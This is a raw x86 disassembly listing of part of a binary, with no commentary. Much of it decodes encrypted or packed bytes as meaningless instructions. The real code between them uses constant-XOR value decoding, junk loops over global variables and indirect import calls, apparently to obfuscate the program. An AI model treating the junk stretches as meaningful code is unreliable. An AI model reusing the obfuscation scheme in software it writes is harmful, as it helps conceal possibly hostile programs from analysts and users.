  4051cb:	add    DWORD PTR [esi],edi
  4051cd:	arpl   di,bx
  4051cf:	inc    ebp
  4051d0:	mov    al,0x2b
  4051d2:	mov    WORD PTR [edx-0x61],ss
  4051d5:	jge    0x405213
  4051d7:	ins    BYTE PTR es:[edi],dx
  4051d8:	(bad)  
  4051da:	rcl    DWORD PTR [ecx],1
  4051dc:	outs   dx,BYTE PTR ds:[esi]
  4051dd:	mov    edx,0x29bf2cf3
  4051e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051e4:	add    BYTE PTR ds:0x9caf3f3c,ch
  4051ea:	lock fstp DWORD PTR [esi-0x24]
  4051ee:	jle    0x405260
  4051f0:	mov    bh,0x94
  4051f2:	cmp    DWORD PTR [edi+0x5d430e57],edx
  4051f8:	xor    DWORD PTR [ecx+0x1e751630],esi
  4051fe:	lods   al,BYTE PTR ds:[esi]
  4051ff:	clc    
  405200:	inc    esi
  405201:	sti    
  405202:	xlat   BYTE PTR ds:[ebx]
  405203:	pop    edx
  405204:	cmp    eax,0x1c2b890e
  405209:	jb     0x4051ab
  40520b:	pop    es
  40520c:	sar    DWORD PTR [ebp-0x6f],cl
  40520f:	fsubr  QWORD PTR [ebx+0x74c27b0b]
  405215:	push   es
  405216:	jbe    0x4051c9
  405218:	push   0x72318d70
  40521d:	mov    eax,ds:0xa1d748d7
  405222:	lea    edx,[ebx]
  405224:	dec    ecx
  405225:	jmp    0xbd824077
  40522a:	adc    bh,BYTE PTR [esi+0xae3a438]
  405230:	push   ds
  405231:	sahf   
  405232:	pop    edx
  405233:	out    dx,eax
  405234:	dec    ebx
  405235:	test   eax,0x4542298e
  40523a:	push   ebp
  40523b:	and    eax,0xd95e075b
  405240:	icebp  
  405241:	jne    0x4051e1
  405243:	xor    eax,0x2c0ce301
  405248:	fcmovb st,st(6)
  40524a:	xor    eax,DWORD PTR [eax]
  40524c:	lods   eax,DWORD PTR ds:[esi]
  40524d:	popf   
  40524e:	mov    ecx,0x7510854
  405253:	xor    eax,ecx
  405255:	add    eax,0x32729b
  40525a:	mov    DWORD PTR [edx],eax
  40525c:	mov    eax,DWORD PTR [ebp+0x14]
  40525f:	mov    edx,DWORD PTR [ebp+0x10]
  405262:	mov    DWORD PTR [edx+0x4],eax
  405265:	mov    eax,DWORD PTR [ebp+0x18]
  405268:	mov    edx,DWORD PTR [ebp+0x10]
  40526b:	jmp    0x405478
  405270:	sar    DWORD PTR [edx+ebp*4],cl
  405273:	push   ebp
  405274:	mov    cl,0x71
  405276:	icebp  
  405277:	mov    eax,0xd68c6305
  40527c:	(bad)  
  40527d:	jbe    0x4052e6
  40527f:	test   al,0xc6
  405281:	sub    al,0x7e
  405283:	jle    0x4052f3
  405285:	jg     0x405305
  405287:	jle    0x4052ce
  405289:	fstp   DWORD PTR [edx]
  40528b:	mov    eax,0x6b836d72
  405290:	test   DWORD PTR [esi-0x66872b3d],esi
  405296:	cmc    
  405297:	mov    ecx,0xad8a3b0b
  40529c:	stos   BYTE PTR es:[edi],al
  40529d:	xchg   DWORD PTR [esp+ecx*8+0x3c1b3a86],esp
  4052a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052a5:	dec    edi
  4052a6:	retf   0x8fc5
  4052a9:	mov    eax,0xdb081ccf
  4052ae:	inc    ebp
  4052af:	inc    esi
  4052b0:	add    dl,bl
  4052b2:	sub    ebp,esi
  4052b4:	call   DWORD PTR [ebx-0x5e299aba]
  4052ba:	mov    bl,0xaf
  4052bc:	mov    ch,0x3c
  4052be:	inc    esi
  4052bf:	stos   BYTE PTR es:[edi],al
  4052c0:	cmc    
  4052c1:	imul   ebx,DWORD PTR [eax+edi*2-0x3394acab],0x133bfa45
  4052cc:	add    DWORD PTR [ebp+0x54],ecx
  4052cf:	sti    
  4052d0:	inc    ecx
  4052d1:	push   eax
  4052d2:	pop    edx
  4052d3:	iret   
  4052d4:	sbb    dl,ah
  4052d6:	pop    ds
  4052d7:	retf   
  4052d8:	jb     0x4052f5
  4052da:	or     DWORD PTR [ebx+0x1b],edx
  4052dd:	add    DWORD PTR [ebx],edx
  4052df:	in     al,dx
  4052e0:	add    eax,0xe551c78
  4052e5:	and    esi,DWORD PTR [edi+0x7adf970b]
  4052eb:	stc    
  4052ec:	mov    ah,0x61
  4052ee:	xchg   edi,eax
  4052ef:	outs   dx,DWORD PTR ds:[esi]
  4052f0:	out    0x99,al
  4052f2:	mov    esp,ss
  4052f4:	sbb    eax,0x8b02cc5e
  4052f9:	dec    ecx
  4052fa:	inc    ebx
  4052fb:	pop    ss
  4052fc:	int    0x55
  4052fe:	add    eax,0xae235e1b
  405303:	aad    0x8c
  405305:	inc    ebx
  405307:	das    
  405308:	cmp    dl,dh
  40530a:	xor    al,0x89
  40530c:	mov    edi,0xd040fd91
  405311:	loopne 0x4052a0
  405313:	mov    cl,0xd
  405315:	call   0x72387918
  40531a:	gs push eax
  40531c:	out    dx,al
  40531d:	iret   
  40531e:	push   es
  40531f:	fdivr  DWORD PTR [ebp-0x44]
  405322:	cli    
  405323:	call   0xa64b:0x2e1ff2e2
  40532a:	es pop ecx
  40532c:	adc    BYTE PTR [esi],cl
  40532e:	xor    DWORD PTR [edi+edi*2-0x10],0x32af5996
  405336:	or     eax,0x676eaabe
  40533b:	repz mov esp,0xb0222735
  405341:	aaa    
  405342:	dec    ecx
  405343:	clc    
  405344:	outs   dx,DWORD PTR ds:[esi]
  405345:	mov    ecx,0xef1ad4fc
  40534a:	mov    ch,0x6f
  40534c:	test   DWORD PTR [ebx-0x42],esp
  40534f:	adc    eax,0xbffad3e6
  405354:	int3   
  405355:	inc    edx
  405356:	jg     0x4052f2
  405358:	xchg   ebx,eax
  405359:	dec    ebx
  40535a:	scas   al,BYTE PTR es:[edi]
  40535b:	adc    DWORD PTR [edx],esp
  40535d:	in     eax,dx
  40535e:	loopne 0x4053a1
  405360:	jae    0x4053c2
  405362:	sub    bl,cl
  405364:	lea    edx,[eax]
  405366:	push   ebp
  405367:	shr    DWORD PTR [edi+0x67],1
  40536a:	ret    
  40536b:	daa    
  40536c:	xor    BYTE PTR ds:0xf5e85a53,0x10
  405373:	js     0x40532f
  405375:	or     eax,0xddb02961
  40537a:	push   edi
  40537b:	or     bl,ch
  40537d:	pop    ss
  40537e:	int    0x94
  405380:	cli    
  405381:	mov    cl,0x6e
  405383:	lods   eax,DWORD PTR ds:[esi]
  405384:	push   ds
  405385:	or     ah,BYTE PTR [ebx-0x18]
  405388:	cld    
  405389:	xor    cl,BYTE PTR fs:[eax+0x60861296]
  405390:	xor    eax,0xce0c565
  405395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405396:	jae    0x405353
  405398:	xor    dh,BYTE PTR [ecx+0x1126a77e]
  40539e:	push   esp
  40539f:	jle    0x4053c7
  4053a1:	bound  edx,QWORD PTR [ebx]
  4053a3:	sbb    bl,BYTE PTR [edx]
  4053a5:	scas   al,BYTE PTR es:[edi]
  4053a6:	xchg   BYTE PTR ds:0xce9d8bb5,ch
  4053ac:	mov    edi,0x4fb24869
  4053b1:	imul   esi,DWORD PTR [eax],0xffffffac
  4053b4:	xchg   esp,eax
  4053b5:	mov    ?,WORD PTR [ebx]
  4053b7:	pushf  
  4053b8:	and    DWORD PTR [ecx],ecx
  4053ba:	fisttp WORD PTR [edx+0x5a]
  4053bd:	dec    eax
  4053be:	cli    
  4053bf:	test   DWORD PTR [ebx+0x74bf4c37],esp
  4053c5:	push   es
  4053c6:	pop    ebp
  4053c7:	mov    ds:0xd4d9e189,al
  4053cc:	xchg   ebp,eax
  4053cd:	mov    dl,0x1
  4053cf:	xlat   BYTE PTR ds:[ebx]
  4053d0:	loopne 0x4053a9
  4053d2:	aas    
  4053d3:	fmul   DWORD PTR [eax-0x17]
  4053d6:	and    al,BYTE PTR [ebx+0x34490514]
  4053dc:	leave  
  4053dd:	mov    ch,0x6c
  4053df:	jg     0x40541f
  4053e1:	test   eax,0xa882f831
  4053e6:	shr    DWORD PTR [eax+edi*1+0x2553ea58],cl
  4053ed:	div    bl
  4053ef:	xor    BYTE PTR [ebx-0x68],0x97
  4053f3:	xchg   esi,eax
  4053f4:	aas    
  4053f5:	lahf   
  4053f6:	dec    edi
  4053f7:	inc    eax
  4053f8:	mov    esi,0xb56772cb
  4053fd:	ret    
  4053fe:	pop    es
  4053ff:	mov    edi,DWORD PTR [eax]
  405401:	in     al,dx
  405402:	jmp    FWORD PTR [edx]
  405404:	in     al,0x79
  405406:	jg     0x4053ec
  405408:	(bad)  
  405409:	mov    al,ds:0xf3604c05
  40540e:	cmp    BYTE PTR [edi-0xe],al
  405411:	scas   eax,DWORD PTR es:[edi]
  405412:	data16 loope 0x4053e9
  405415:	pop    esp
  405416:	push   edx
  405417:	stos   DWORD PTR es:[edi],eax
  405418:	or     al,0x54
  40541a:	jge    0x405477
  40541c:	push   0xeb65631e
  405421:	mov    ebx,DWORD PTR [eax-0x17abf466]
  405427:	xor    esi,DWORD PTR [ebx]
  405429:	into   
  40542a:	mov    esp,0x9100193e
  40542f:	xor    eax,0xcf7c431f
  405434:	xlat   BYTE PTR ds:[ebx]
  405435:	scas   al,BYTE PTR es:[edi]
  405436:	ja     0x405448
  405438:	xlat   BYTE PTR ds:[ebx]
  405439:	sbb    ebp,ebp
  40543b:	cmp    ebx,eax
  40543d:	out    dx,al
  40543e:	and    eax,0x1a472d9b
  405443:	loopne 0x405455
  405445:	dec    edx
  405446:	test   eax,0x2475eed3
  40544b:	test   al,0xbc
  40544d:	mov    BYTE PTR [edi],dh
  40544f:	std    
  405450:	pop    ds
  405451:	or     BYTE PTR [edx+0x3f],bl
  405454:	dec    edx
  405455:	dec    edi
  405456:	cmp    DWORD PTR [ecx+eiz*4+0x75],edx
  40545a:	clc    
  40545b:	jp     0x405419
  40545d:	gs push ss
  40545f:	add    DWORD PTR [edx+0x992ef76],eax
  405465:	pop    ebp
  405466:	mov    eax,0xfd77a644
  40546b:	sbb    al,0x85
  40546d:	retf   0xbddb
  405470:	retf   0x12a1
  405473:	mov    esi,0xfe7cc0bb
  405478:	mov    DWORD PTR [edx+0x8],eax
  40547b:	mov    eax,DWORD PTR [ebp+0x1c]
  40547e:	mov    edx,DWORD PTR [ebp+0x10]
  405481:	mov    DWORD PTR [edx+0xc],eax
  405484:	mov    eax,DWORD PTR [ebp+0x20]
  405487:	mov    edx,DWORD PTR [ebp+0x10]
  40548a:	mov    DWORD PTR [edx+0x10],eax
  40548d:	mov    eax,eax
  40548f:	mov    eax,DWORD PTR [ebp+0x14]
  405492:	test   eax,eax
  405494:	mov    eax,DWORD PTR [ebp+0x8]
  405497:	jne    0x4054a0
  40549d:	mov    eax,DWORD PTR [ebp+0xc]
  4054a0:	xor    eax,ecx
  4054a2:	add    eax,0x32729b
  4054a7:	leave  
  4054a8:	ret    0x1c
  4054ab:	push   ebp
  4054ac:	mov    ebp,esp
  4054ae:	sub    esp,0x78
  4054b1:	mov    eax,ds:0x4121a8
  4054b6:	mov    DWORD PTR [ebp-0x10],eax
  4054b9:	mov    eax,ds:0x4122b4
  4054be:	mov    DWORD PTR [ebp-0x30],eax
  4054c1:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  4054c8:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  4054cf:	mov    eax,ds:0x43035f
  4054d4:	sbb    DWORD PTR ds:0x4302c5,eax
  4054da:	mov    eax,DWORD PTR [ebp-0xc]
  4054dd:	xor    DWORD PTR ds:0x4302f1,0x5a75
  4054e7:	push   ebx
  4054e8:	push   esi
  4054e9:	push   edi
  4054ea:	or     DWORD PTR ds:0x4302d5,0x19e9
  4054f4:	mov    esi,0x7510854
  4054f9:	xor    eax,esi
  4054fb:	mov    edi,0x32729b
  405500:	add    eax,edi
  405502:	or     DWORD PTR ds:0x430363,0x57a7
  40550c:	mov    DWORD PTR [ebp-0x20],eax
  40550f:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  405516:	and    DWORD PTR ds:0x4302d5,0x0
  405520:	jmp    0x405530
  405525:	mov    eax,ds:0x4302d5
  40552a:	inc    eax
  40552b:	mov    ds:0x4302d5,eax
  405530:	cmp    DWORD PTR ds:0x4302d5,0x1d
  405537:	jae    0x4057cb
  40553d:	cmp    DWORD PTR ds:0x4302d5,0x4
  405544:	jne    0x405555
  40554a:	push   0x35c7
  40554f:	call   DWORD PTR ds:0x42ea97
  405555:	cmp    DWORD PTR ds:0x4302d5,0x3
  40555c:	jne    0x40556d
  405562:	mov    eax,ds:0x4302d5
  405567:	inc    eax
  405568:	mov    ds:0x4302d5,eax
  40556d:	jmp    0x405525
  405572:	mov    DWORD PTR ds:0x4302f1,0x14
  40557c:	cmp    DWORD PTR ds:0x4302f1,0x0
  405583:	je     0x4057cb
  405589:	cmp    DWORD PTR ds:0x4302f1,0x2
  405590:	jne    0x4055a2
  405596:	push   DWORD PTR [ebp-0x20]
  405599:	push   DWORD PTR [ebp-0x20]
  40559c:	call   DWORD PTR ds:0x42e923
  4055a2:	cmp    DWORD PTR ds:0x4302f1,0x3
  4055a9:	jne    0x4055bd
  4055af:	xor    eax,eax
  4055b1:	xor    eax,DWORD PTR ds:0x4302f1
  4055b7:	dec    eax
  4055b8:	mov    ds:0x4302f1,eax
  4055bd:	mov    eax,ds:0x4302f1
  4055c2:	dec    eax
  4055c3:	mov    ds:0x4302f1,eax
  4055c8:	jmp    0x40557c
  4055cd:	or     DWORD PTR ds:0x42ec53,edi
  4055d3:	jmp    0x4057cb
  4055d8:	jl     0x405580
  4055da:	inc    bl
  4055dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055dd:	jecxz  0x405620
  4055df:	popa   
  4055e0:	xor    eax,0xe0a2c60a
  4055e5:	shr    DWORD PTR [esi+0xb],0x36
  4055e9:	sub    bh,BYTE PTR [esi+0x7e]
  4055ec:	push   ebp
  4055ed:	jg     0x40566d
  4055ef:	jle    0x405593
  4055f1:	fsin   
  4055f3:	inc    eax
  4055f4:	mov    ds:0xc8bb6ad6,eax
  4055f9:	add    al,0x85
  4055fb:	(bad)  
  4055fc:	push   edx
  4055fd:	call   0x1f20cac1
  405602:	mov    edi,0x2887f69c
  405607:	push   ecx
  405608:	shr    DWORD PTR [edx+0x70],cl
  40560b:	iret   
  40560c:	mov    eax,0x4e6803ee
  405611:	jnp    0x405609
  405613:	scas   al,BYTE PTR es:[edi]
  405614:	sbb    eax,0x9500a237
  405619:	push   ds
  40561a:	jge    0x405637
  40561c:	sub    eax,0x2461cc09
  405621:	push   ebx
  405622:	or     al,0x9f
  405624:	fsub   DWORD PTR [esi-0x26]
  405627:	pop    ecx
  405628:	push   0xffffffdb
  40562a:	daa    
  40562b:	ins    BYTE PTR es:[edi],dx
  40562c:	inc    eax
  40562d:	repz cwde 
  40562f:	ss aaa 
  405631:	mov    edx,edx
  405633:	test   eax,0xd3ae9cb7
  405639:	xor    esp,esi
  40563b:	imul   esp,DWORD PTR [ebp-0x64e9cd9b],0x26
  405642:	mov    es,WORD PTR [ecx]
  405644:	mov    dl,0x43
  405646:	(bad)  
  405648:	mov    ds:0x514c88a4,eax
  40564d:	jg     0x4055d6
  40564f:	mov    dl,0x20
  405651:	call   0x6ce9:0x2263c947
  405658:	out    0xba,eax
  40565a:	inc    ebp
  40565b:	(bad)  
  40565c:	cmp    DWORD PTR [ebp-0x4a],esi
  40565f:	dec    ebx
  405660:	jno    0x40563d
  405662:	cmp    DWORD PTR [ecx],edi
  405664:	xchg   esp,eax
  405665:	lock mov dl,0xdb
  405668:	push   edi
  405669:	in     eax,dx
  40566a:	in     al,dx
  40566b:	or     al,0x35
  40566d:	lahf   
  40566e:	jmp    0xf8bc:0x1936d984
  405675:	cmp    bl,BYTE PTR [edi+0x7f]
  405678:	shl    BYTE PTR [ecx+0xe9619f1],0x18
  40567f:	rcr    BYTE PTR [ecx-0x7a84de98],cl
  405685:	ins    DWORD PTR es:[edi],dx
  405686:	or     dh,ch
  405688:	adc    al,0x4f
  40568a:	mov    WORD PTR [ebx+0x901e572],fs
  405690:	mov    edi,0xa6a92e20
  405695:	or     eax,0xbb0b0d4a
  40569a:	xchg   ecx,eax
  40569b:	(bad)  
  40569c:	mov    esp,0xf6d10e28
  4056a1:	cmp    al,0x6f
  4056a3:	xchg   edx,eax
  4056a4:	xchg   edi,eax
  4056a5:	push   ebp
  4056a6:	stos   BYTE PTR es:[edi],al
  4056a7:	pop    edx
  4056a8:	jmp    0xa065:0x4b2c5bd5
  4056af:	pop    ebp
  4056b0:	mov    dl,0x90
  4056b2:	jle    0x405675
  4056b4:	sahf   
  4056b5:	cli    
  4056b6:	inc    esi
  4056b7:	and    al,BYTE PTR [ebp-0x1e]
  4056ba:	mov    ah,0x7d
  4056bc:	retf   0x60c0
  4056bf:	shl    BYTE PTR [edi-0x4b384618],cl
  4056c5:	in     al,0xb9
  4056c7:	rep outs dx,DWORD PTR ds:[esi]
  4056c9:	shr    BYTE PTR [edx-0xf],1
  4056cc:	fild   DWORD PTR [ebp-0xba57426]
  4056d2:	mov    ebp,0xe13e2fb0
  4056d7:	and    ch,dl
  4056d9:	imul   esi,DWORD PTR [esi],0x6572cc4e
  4056df:	clc    
  4056e0:	add    al,0x5
  4056e2:	sub    eax,0xfac2e2ec
  4056e7:	jmp    0x405749
  4056e9:	pop    ds
  4056ea:	xchg   ecx,eax
  4056eb:	xchg   esp,eax
  4056ec:	sti    
  4056ed:	jecxz  0x40568e
  4056ef:	adc    bh,0xb
  4056f2:	(bad)  
  4056f3:	jnp    0x405679
  4056f5:	push   0xffffff89
  4056f7:	je     0x405763
  4056f9:	cwde   
  4056fa:	sub    DWORD PTR ds:0x3c473ec1,ebp
  405700:	clc    
  405701:	(bad)  
  405702:	xor    DWORD PTR [ebx],ecx
  405704:	jmp    DWORD PTR [eax-0x21]
  405707:	out    0x24,al
  405709:	pop    edx
  40570a:	jmp    0x8e5cc37f
  40570f:	ret    0x771d
  405712:	cs pop ebx
  405714:	mov    ebp,esi
  405716:	sbb    eax,0xd8a4db21
  40571b:	das    
  40571c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40571d:	and    edi,DWORD PTR [edi-0x728d24b4]
  405723:	cmp    eax,0x7942ba08
  405728:	jmp    0x4056f4
  40572a:	jecxz  0x40578a
  40572c:	out    0xc7,eax
  40572e:	mov    dh,0x46
  405730:	in     eax,0xbc
  405732:	xor    DWORD PTR [eax+ebp*8+0x35602a25],0xa0a24ca9
  40573d:	mov    esi,0x29e08313
  405742:	mov    al,0x7c
  405744:	enter  0x9af8,0x9b
  405748:	jp     0x405705
  40574a:	sbb    eax,0x9e73fbb7
  40574f:	xchg   edi,eax
  405750:	or     esp,ebx
  405752:	add    edi,DWORD PTR [ecx+0x2d8b31f0]
  405758:	retf   0x3e2a
  40575b:	jmp    0x405777
  40575d:	(bad)  
  40575f:	adc    dl,BYTE PTR [esi+0x75]
  405762:	fldl2e 
  405764:	and    eax,0xe096823c
  405769:	out    0xe0,al
  40576b:	ja     0x4057a4
  40576d:	cmp    eax,0x349661f7
  405772:	lds    esi,FWORD PTR [esi+0x4556b2dc]
  405778:	xor    BYTE PTR [ebx-0x3f],cl
  40577b:	cld    
  40577c:	dec    edi
  40577d:	jo     0x40578d
  40577f:	in     eax,dx
  405780:	cmp    al,BYTE PTR [eax]
  405782:	inc    eax
  405783:	push   edx
  405784:	jmp    0x4057c6
  405786:	mov    esp,0xfe4dd734
  40578b:	fcom   DWORD PTR [esi]
  40578d:	mov    dl,0x70
  40578f:	(bad)  
  405791:	or     esp,edx
  405793:	enter  0x3974,0x70
  405797:	test   eax,0xb52630fa
  40579c:	push   esi
  40579d:	(bad)
  4057a1:	mov    dh,0x16
  4057a3:	and    BYTE PTR [ecx+edi*8-0x693967b0],bl
  4057aa:	xchg   ecx,eax
  4057ab:	sub    ebx,DWORD PTR ds:0x233c463d
  4057b1:	and    eax,0xabe93391
  4057b6:	dec    esi
  4057b7:	jmp    0xfd354c5e
  4057bc:	cmp    eax,0xe57a01e2
  4057c1:	sahf   
  4057c2:	arpl   WORD PTR [eax-0x76],dx
  4057c5:	imul   esp,DWORD PTR [ebx-0x240fc23f],0xffffffc7
  4057cc:	inc    ebp
  4057cd:	int3   
  4057ce:	xor    DWORD PTR ds:0x5c7f89f,eax
  4057d4:	pop    ebx
  4057d5:	in     al,dx
  4057d6:	inc    edx
  4057d7:	add    BYTE PTR [edx],bl
  4057d9:	add    BYTE PTR [eax],al
  4057db:	add    BYTE PTR [ebx+0x42ec5b3d],al
  4057e1:	add    BYTE PTR [eax],al
  4057e3:	je     0x405811
  4057e9:	cmp    DWORD PTR ds:0x42ec5b,0x29
  4057f0:	jne    0x4057ff
  4057f6:	push   DWORD PTR [ebp-0x24]
  4057f9:	call   DWORD PTR ds:0x42e857
  4057ff:	mov    eax,ds:0x42ec5b
  405804:	dec    eax
  405805:	mov    ds:0x42ec5b,eax
  40580a:	jmp    0x4057dc
  40580f:	neg    eax
  405811:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  405818:	mov    eax,ds:0x42e648
  40581d:	or     DWORD PTR ds:0x4302c5,eax
  405823:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  40582a:	mov    eax,DWORD PTR [ebp-0xc]
  40582d:	and    DWORD PTR ds:0x4302b9,0x7e31
  405837:	xor    eax,esi
  405839:	add    eax,edi
  40583b:	mov    DWORD PTR [ebp-0x18],eax
  40583e:	sbb    DWORD PTR ds:0x42e654,0x48a8
  405848:	mov    DWORD PTR [ebp-0x1c],0xf89c853e
  40584f:	sub    eax,DWORD PTR ds:0x42ec6f
  405855:	mov    BYTE PTR [ebp-0x1],0x67
  405859:	mov    DWORD PTR ds:0x42ec5b,0x1c
  405863:	cmp    DWORD PTR ds:0x42ec5b,0x0
  40586a:	je     0x4058ae
  405870:	cmp    DWORD PTR ds:0x42ec5b,0xe
  405877:	jne    0x405886
  40587d:	push   DWORD PTR [ebp-0x18]
  405880:	call   DWORD PTR ds:0x42e85b
  405886:	cmp    DWORD PTR ds:0x42ec5b,0xf
  40588d:	jne    0x40589e
  405893:	mov    eax,ds:0x42ec5b
  405898:	dec    eax
  405899:	mov    ds:0x42ec5b,eax
  40589e:	mov    eax,ds:0x42ec5b
  4058a3:	dec    eax
  4058a4:	mov    ds:0x42ec5b,eax
  4058a9:	jmp    0x405863
  4058ae:	mov    eax,DWORD PTR [ebp-0xc]
  4058b1:	or     DWORD PTR ds:0x4302c1,0x42ec53
  4058bb:	xor    eax,esi
  4058bd:	add    eax,edi
  4058bf:	mov    DWORD PTR [ebp-0x18],eax
  4058c2:	mov    eax,DWORD PTR [ebp-0x24]
  4058c5:	sbb    DWORD PTR ds:0x4302b5,0x42e644
  4058cf:	xor    eax,esi
  4058d1:	sbb    DWORD PTR ds:0x430353,0xd15
  4058db:	add    eax,edi
  4058dd:	inc    DWORD PTR ds:0x4302dd
  4058e3:	push   eax
  4058e4:	xor    eax,eax
  4058e6:	xor    eax,DWORD PTR ds:0x4302bd
  4058ec:	xor    DWORD PTR ds:0x4302e1,eax
  4058f2:	mov    eax,DWORD PTR [ebp-0x28]
  4058f5:	sub    DWORD PTR ds:0x4302d1,0x42ec6f
  4058ff:	xor    eax,esi
  405901:	or     DWORD PTR ds:0x4302c1,0x42e648
  40590b:	add    eax,edi
  40590d:	push   eax
  40590e:	or     eax,DWORD PTR ds:0x4302c1
  405914:	mov    eax,DWORD PTR [ebp-0x1c]
  405917:	or     DWORD PTR ds:0x42ec53,0x39ed
  405921:	xor    eax,esi
  405923:	not    DWORD PTR ds:0x42ec6b
  405929:	add    eax,edi
  40592b:	adc    DWORD PTR ds:0x4302e9,0x43036b
  405935:	push   eax
  405936:	sbb    DWORD PTR ds:0x4302e9,0x42e648
  405940:	lea    eax,[ebp-0x78]
  405943:	push   eax
  405944:	dec    DWORD PTR ds:0x430353
  40594a:	push   DWORD PTR [ebp-0xc]
  40594d:	sub    DWORD PTR ds:0x430353,0x42e654
  405957:	push   DWORD PTR [ebp-0x14]
  40595a:	and    DWORD PTR ds:0x4302bd,0x42ec5b
  405964:	call   0x4046ad
  405969:	test   eax,eax
  40596b:	je     0x405da5
  405971:	lea    eax,[ebp-0x78]
  405974:	sbb    DWORD PTR ds:0x42ec4f,0x42ec6b
  40597e:	push   eax
  40597f:	movzx  eax,BYTE PTR ds:0x4302d5
  405986:	sbb    eax,DWORD PTR ds:0x4302ed
  40598c:	mov    ds:0x4302d5,eax
  405991:	jmp    0x405b89
  405996:	xor    DWORD PTR [ecx+0x5c],esi
  405999:	sbb    eax,0x7171315c
  40599e:	repnz fistp WORD PTR [esi-0x48]
  4059a2:	in     eax,dx
  4059a3:	sub    al,0x4c
  4059a5:	adc    eax,0x7e7e280d
  4059aa:	push   ebp
  4059ab:	jg     0x405a2b
  4059ad:	jle    0x4059a5
  4059af:	sbb    DWORD PTR [edx],esi
  4059b1:	icebp  
  4059b2:	popf   
  4059b3:	aam    0x6a
  4059b5:	or     BYTE PTR [esi],bl
  4059b7:	ror    eax,1
  4059b9:	fld    TBYTE PTR [ebp-0x9254db5]
  4059bf:	dec    esi
  4059c0:	imul   ebp,DWORD PTR ds:0xcdb8d8ca,0xffffffc2
  4059c7:	push   0xffffffb5
  4059c9:	pusha  
  4059ca:	(bad)  
  4059cb:	adc    dh,bh
  4059cd:	add    DWORD PTR [edi-0x6d64439a],ebp
  4059d3:	enter  0xa39f,0xba
  4059d7:	xchg   BYTE PTR [esi-0x353ae144],cl
  4059dd:	mov    ch,0x13
  4059df:	and    esi,DWORD PTR [esi-0x405c2cf7]
  4059e5:	or     al,0xe0
  4059e7:	popa   
  4059e8:	test   eax,0xc6b0dd00
  4059ed:	mov    eax,0x83fb0560
  4059f2:	cmp    DWORD PTR [eax+0xf],eax
  4059f5:	jecxz  0x405994
  4059f7:	and    BYTE PTR [ecx],cl
  4059f9:	(bad)  
  4059fa:	mov    esp,0x373ed8c9
  4059ff:	loopne 0x4059e9
  405a01:	adc    eax,0xd6bb76ce
  405a06:	cmp    al,0x3e
  405a08:	stos   BYTE PTR es:[edi],al
  405a09:	xor    ecx,DWORD PTR [ecx+0x43b4a7b1]
  405a0f:	les    dx,DWORD PTR [ebx]
  405a12:	cmp    eax,0x1377b804
  405a17:	or     BYTE PTR [eax-0xd],dh
  405a1a:	rcl    esi,cl
  405a1c:	pusha  
  405a1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a1e:	ins    DWORD PTR es:[edi],dx
  405a1f:	pop    esi
  405a20:	lods   eax,DWORD PTR ds:[esi]
  405a21:	mov    al,ds:0x8c8764c0
  405a26:	idiv   BYTE PTR [edx+0x79]
  405a29:	std    
  405a2a:	outs   dx,DWORD PTR ds:[esi]
  405a2b:	push   0xe5deffca
  405a30:	dec    edi
  405a31:	leave  
  405a32:	sub    eax,0xfe0c1f1
  405a37:	push   es
  405a38:	inc    edi
  405a39:	jmp    0x7555:0x450e3781
  405a40:	pop    ss
  405a41:	js     0x405a30
  405a43:	pusha  
  405a44:	jno    0x405aab
  405a46:	and    BYTE PTR [ecx-0x4433408e],ch
  405a4c:	add    esi,ebp
  405a4e:	mov    ebx,0xf18c2a9e
  405a53:	sub    esp,DWORD PTR [ecx-0x4a7b9aa0]
  405a59:	mov    eax,0x140c692f
  405a5e:	jg     0x405adf
  405a60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a61:	mov    bl,0x10
  405a63:	mov    ds:0x9824219e,eax
  405a68:	adc    eax,0x48fb5284
  405a6d:	cdq    
  405a6e:	pushf  
  405a6f:	cmp    BYTE PTR [esi+ebp*1-0x6f],al
  405a73:	clc    
  405a74:	jb     0x405a84
  405a76:	sbb    DWORD PTR [ebx+0x636df701],edx
  405a7c:	xlat   BYTE PTR ds:[ebx]
  405a7d:	retf   
  405a7e:	fiadd  DWORD PTR [ebx+ebx*1]
  405a81:	in     al,0x49
  405a83:	mov    esp,0x921da359
  405a88:	scas   eax,DWORD PTR es:[edi]
  405a89:	jmp    0x405af3
  405a8b:	mul    BYTE PTR [esi-0x62]
  405a8e:	xchg   ebp,eax
  405a8f:	fisubr WORD PTR [ebp-0x394dcd6a]
  405a95:	push   cs
  405a96:	test   DWORD PTR [esp+esi*1],edx
  405a99:	sbb    ch,bl
  405a9b:	or     dl,BYTE PTR [ecx+ecx*1-0x32869f79]
  405aa2:	icebp  
  405aa3:	and    BYTE PTR [edx+0x5272ad9],al
  405aa9:	jg     0x405ab7
  405aab:	xlat   BYTE PTR ds:[ebx]
  405aac:	pop    DWORD PTR [ebx+ebp*8+0x43b05b33]
  405ab3:	sub    al,0x2b
  405ab5:	sbb    al,0x93
  405ab7:	hlt    
  405ab8:	xor    al,0x1d
  405aba:	fs mov edi,ss
  405abd:	mov    dl,0xfd
  405abf:	adc    dl,BYTE PTR [ebx]
  405ac1:	xchg   DWORD PTR [edx-0x3],edx
  405ac4:	and    esi,ebp
  405ac6:	or     bh,bl
  405ac8:	stos   DWORD PTR es:[edi],eax
  405ac9:	dec    ebx
  405aca:	add    edi,DWORD PTR [ebx-0x44]
  405acd:	xor    eax,DWORD PTR [edi+ebx*2]
  405ad0:	inc    edi
  405ad1:	ret    
  405ad2:	shl    DWORD PTR [edx-0x59],cl
  405ad5:	mov    esi,0x148f39af
  405ada:	cmp    ebp,edi
  405adc:	cwde   
  405add:	adc    al,0xf5
  405adf:	and    eax,DWORD PTR [edi+0x25]
  405ae2:	out    dx,al
  405ae3:	jns    0x405b3c
  405ae5:	(bad)  
  405ae6:	(bad)  
  405ae7:	jno    0x405a90
